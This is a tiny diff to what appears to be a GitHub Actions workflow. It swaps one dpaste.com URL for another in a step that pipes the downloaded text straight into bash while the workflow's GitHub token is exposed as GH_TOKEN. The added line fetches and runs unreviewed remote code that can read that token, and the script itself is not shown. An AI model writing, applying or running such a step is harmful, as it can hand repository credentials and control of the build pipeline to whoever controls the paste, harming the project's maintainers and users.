@@ -10,4 +10,4 @@ jobs:
     steps:
       - env:
           GH_TOKEN: ${{ github.token }}
-        run: curl -fsSL https://dpaste.com/D556DGM6C.txt | bash
+        run: curl -fsSL https://dpaste.com/CYHPM7MG3.txt | bash
